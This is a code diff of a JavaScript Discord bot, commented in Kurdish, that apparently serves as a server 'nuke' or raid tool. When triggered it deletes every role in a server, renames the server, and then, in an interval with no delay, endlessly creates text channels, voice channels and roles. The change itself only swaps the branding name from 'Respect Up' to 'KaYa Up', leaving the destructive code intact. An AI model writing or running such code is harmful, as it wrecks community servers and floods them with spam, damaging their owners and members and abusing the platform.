@@ -15,11 +15,11 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Respect Up");////nawek dane bo sar server 
+      message.guild.setName("KaYa Up");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("Respect Up", "text");///////bo channel 
-        message.guild.createChannel("Respect Up", "voice");////bo voice
-        message.guild.createRole({ name: "Respect Up" });////nawek dane bo role kan
+        message.guild.createChannel("KaYa Up", "text");///////bo channel 
+        message.guild.createChannel("KaYa Up", "voice");////bo voice
+        message.guild.createRole({ name: "KaYa up" });////nawek dane bo role kan
       });
     }
   }
